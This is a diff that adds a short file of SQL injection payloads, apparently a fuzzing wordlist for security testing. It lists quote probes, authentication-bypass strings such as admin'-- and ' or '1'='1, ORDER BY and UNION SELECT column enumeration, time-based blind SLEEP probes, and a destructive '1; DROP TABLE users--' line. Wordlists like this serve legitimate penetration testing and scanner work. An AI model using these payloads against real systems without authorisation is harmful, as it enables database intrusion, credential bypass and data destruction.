@@ -1,0 +1,40 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+') or ('1'='1
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or 1=1--
+') or ('1'='1'--
+' or 'x'='x
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' UNION SELECT null--
+1' UNION SELECT null,null--
+1' UNION SELECT null,null,null--
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1; DROP TABLE users--
+1' AND '1'='1
+1' AND '1'='2
+admin'--
+admin'#
+admin'/*
+' or 1=1 LIMIT 1--
+') or 1=1 LIMIT 1--
